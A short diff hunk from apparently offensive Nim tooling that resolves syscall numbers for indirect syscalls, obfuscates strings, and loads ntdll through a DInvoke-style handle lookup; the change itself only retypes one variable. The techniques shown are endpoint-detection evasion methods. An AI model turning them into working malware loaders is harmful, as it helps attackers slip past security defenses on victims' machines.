@@ -345,7 +345,7 @@ when defined(GetSyscallStub):
                     echo obf("[*] Got SSN: ") & toHex(indirect_syscall[4]) & toHex(indirect_syscall[5]) & toHex(indirect_syscall[6]) & toHex(indirect_syscall[7])
                 # GetModuleHandleA for ntdll
                 var ntdllwideString = obf("ntdll.dll")
-                let widentdll = newWideCString(ntdllwideString)
+                var widentdll: WideCString = newWideCString(ntdllwideString)
                 when defined(DInvoke):
                   var hModule: HMODULE = cast[HMODULE](MyGetModuleHandleW(cast[LPCWSTR](widentdll)))
                 else:
